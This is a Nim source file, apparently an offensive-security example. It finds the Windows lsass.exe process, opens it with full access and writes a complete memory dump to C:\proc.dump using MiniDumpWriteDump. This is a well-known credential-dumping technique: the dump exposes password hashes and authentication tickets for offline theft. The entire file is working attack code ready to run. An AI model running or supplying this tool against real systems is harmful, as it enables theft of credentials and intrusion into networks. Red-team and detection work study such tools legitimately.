#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    Enumerates all processes to find lsass.exe and creates a memorydump using MiniDumpWriteDump

    References:
        - https://gist.github.com/xpn/e3837a4fdee8ea1b05f7fea5e7ea9444
        - https://github.com/juancarlospaco/psutil-nim/blob/master/src/psutil/psutil_windows.nim#L55
        - https://github.com/byt3bl33d3r/SILENTTRINITY/blob/master/silenttrinity/core/teamserver/modules/boo/src/minidump.boo
]#

import winim

type
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: INT, 
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetLsassPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "lsass.exe":
                return int(entry.th32ProcessID)

    return 0

when isMainModule:
    let processId: int = GetLsassPid()
    if not bool(processId):
        echo "[X] Unable to find lsass process"
        quit(1)

    echo "[*] lsass PID: ", processId

    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
    if not bool(hProcess):
        echo "[X] Unable to open handle to process"
        quit(1)

    try:
        var fs = open(r"C:\proc.dump", fmWrite)
        echo "[*] Creating memory dump, please wait..."
        var success = MiniDumpWriteDump(
            hProcess,
            cast[DWORD](processId),
            fs.getOsFileHandle(),
            MiniDumpWithFullMemory,
            0,
            0,
            0
        )
        echo "[*] Dump successful: ", bool(success)
        fs.close()
    finally:
        CloseHandle(hProcess)
